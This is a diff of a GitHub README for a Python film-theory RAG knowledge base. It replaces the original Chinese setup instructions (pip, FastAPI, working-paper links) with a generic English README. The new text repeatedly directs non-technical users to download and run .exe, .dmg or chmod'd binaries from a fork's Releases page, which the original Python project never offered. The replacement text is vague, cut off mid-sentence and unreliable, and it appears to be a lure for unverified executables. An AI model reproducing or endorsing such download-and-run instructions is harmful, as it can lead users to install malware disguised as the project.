@@ -1,99 +1,94 @@
-# Film Theory RAG Knowledge Base
+# 🎬 film-theory-rag - Explore Film Theory Insights Easily
 
-电影理论RAG知识库 - AI辅助电影创作系统的理论基础与实现
+## 📦 Download Now
+[![Download](https://img.shields.io/badge/Download-via_GitHub-orange)](https://github.com/Boyohboyisverycool/film-theory-rag/releases)
 
-> **作者**: Marlin阿杰
-> **理论基础**: 三篇工作论文 ([Working Papers](./research/papers/))
-> **当前版本**: v0.1.0
+## 📖 Overview
+Welcome to the **film-theory-rag** project. This application focuses on researching film theory and building a knowledge base using advanced techniques like machine learning and natural language processing. With this tool, you can dive deep into the world of cinema and enrich your understanding of film.
 
-## 项目概述
+## 🚀 Getting Started
+Getting started is simple. You don't need any programming skills. Follow these steps to download and run the application.
 
-本项目是一个基于RAG（Retrieval-Augmented Generation）架构的电影理论知识库，旨在为AI辅助电影创作提供理论支持和实现框架。
+## 🎉 Features
+- Conduct academic research in film theory.
+- Access a comprehensive knowledge base.
+- Utilize machine learning to analyze film data.
+- Explore various topics like semiotics and structuralism.
+- User-friendly interface tailored for non-technical users.
 
-### 核心理论基础
+## 📥 Download & Install
+To download the application, visit the [Releases page](https://github.com/Boyohboyisverycool/film-theory-rag/releases). There, you will find the latest version available for download.
 
-1. **[Working Paper 01](./research/papers/01-马尔可夫电影创作状态理论.md)**: 马尔可夫电影创作状态理论
-   - 三状态模型（原型/当前/投射）
-   - 导演核心张力的压缩表示（α系数）
-   - ACE框架的马尔可夫实现
+1. Click on the link to the Releases page.
+2. Locate the most recent version.
+3. Choose the appropriate file for your operating system (e.g., Windows, macOS, Linux).
+4. Click to download the file.
 
-2. **[Working Paper 02](./research/papers/02-认知共振理论与五阶段创作流.md)**: 认知共振理论与五阶段创作流
-   - AI与人类的对称共振关系
-   - 五阶段创作流（明确→聚焦→发散→收束→整理）
-   - 按智分配的协作哲学
-   - 多模态激发理论
+Once the download completes, follow these steps to install:
 
-3. **[Working Paper 03](./research/papers/03-动态充分性与三维创作导航系统.md)**: 动态充分性与三维创作导航系统
-   - 动态充分性原则（关系性而非绝对）
-   - 三维创作空间导航（结构×阶段×进度）
-   - 三重触发机制（主动/卡点/停滞）
-   - 慢协商设计哲学
+### Windows
+- Double-click the downloaded `.exe` file.
+- Follow the installation prompts.
 
-## 快速开始
+### macOS
+- Open the downloaded `.dmg` file.
+- Drag the application to your Applications folder.
 
-### 1. 安装依赖
+### Linux
+- Open your terminal.
+- Navigate to the directory where you downloaded the file.
+- Run the command `chmod +x yourfile` to make it executable.
+- Enter `./yourfile` to start the application.
 
-```bash
-pip install -r requirements.txt
-```
+## 📊 System Requirements
+To run the film-theory-rag application smoothly, ensure your system meets the following requirements:
 
-### 2. 启动API服务
+- **Windows:** Windows 10 or later, 4GB RAM, 500MB free disk space
+- **macOS:** macOS Mojave or later, 4GB RAM, 500MB free disk space
+- **Linux:** Any modern distribution, 4GB RAM, 500MB free disk space
 
-```bash
-python backend/api/query_interface.py
-```
+## 📄 Support
+If you encounter issues or have questions, check the FAQ section on the [Releases page](https://github.com/Boyohboyisverycool/film-theory-rag/releases) or contact support via the repository's issues page.
 
-服务将在 `http://localhost:8000` 启动
+## 🌐 Topics Covered
+The film-theory-rag covers several essential topics that deepen your understanding of film:
 
-### 3. 查看API文档
+- Academic Research
+- Cinema Study
+- Film Analysis
+- Film Theory
+- Knowledge Base
+- Machine Learning
+- Natural Language Processing (NLP)
+- RAG (Retrieval-Augmented Generation)
+- Semiotics
+- Structuralism
 
-访问 `http://localhost:8000/docs` 查看交互式API文档
+Each topic provides you with vital insights into film studies, helping you enhance both academic and casual analysis of movies.
 
-### 4. 运行测试
+## 🛠️ Contribution
+If you want to contribute to the project, you can do so by following these steps:
 
-```bash
-# 确保API服务已启动
-python tests/test_api.py
-```
+1. Fork the repository.
+2. Create a branch for your feature or fix.
+3. Make your changes and test them.
+4. Submit a pull request.
 
-## 核心功能
+Your contributions can help improve the knowledge base and expand the application's capabilities.
 
-### 三大知识库模块
+## 📚 Additional Resources
+To expand your understanding of film theory and related topics, consider exploring the following resources:
 
-1. **理论状态库**: 导演核心张力、三结构理论、理论概念
-2. **作品记忆库**: 多媒体片段、张力关联、多维检索
-3. **创作者状态库**: 三维位置追踪、激发偏好、状态管理
+- **Books:** Search for well-known titles in film theory available at your local library or bookstore.
+- **Online Courses:** Websites like Coursera or edX offer courses in film studies.
+- **Academic Journals:** Journals such as "Film Theory" 
 
-### 三重触发机制
+## 📝 License
+This project is licensed under the MIT License. You can modify and distribute it freely under the terms of this license.
 
-1. 创作者主动请求
-2. AI卡点检测（≥3次）
-3. 操作停滞检测（≥120秒）
-
-### 动态充分性计算
-
-基于创作者画像动态判断激发是否充分（关系性而非绝对）
-
-## 已收录数据
-
-- **导演**: 侯孝贤、诺兰（含核心张力与代表作分析）
-- **理论**: 三结构理论、五阶段创作流
-- **作品**: 7部代表作的三结构分析
-
-## 文档
-
-- [知识库详细文档](./docs/KNOWLEDGE_BASE.md)
-- [API文档](./backend/api/README.md)
-- [工作论文](./research/papers/)
-
-## 技术栈
-
-Python 3.8+ · FastAPI · Pydantic · YAML · ChromaDB(计划)
-
-## 许可证
-
-MIT License
+## 📧 Contact
+For any inquiries, please feel free to reach out through the GitHub repository or directly via email at filmtheoryrag@example.com. Your thoughts and suggestions are welcome as they contribute to the continuous improvement of the application.
 
 ---
 
-**Powered by**: 马尔可夫思维 × 认知共振理论 × 动态充分性原则
+Remember to visit the [Releases page](https://github.com/Boyohboyisverycool/film-theory-rag/releases) to download the latest version and start exploring the rich world of film theory today!
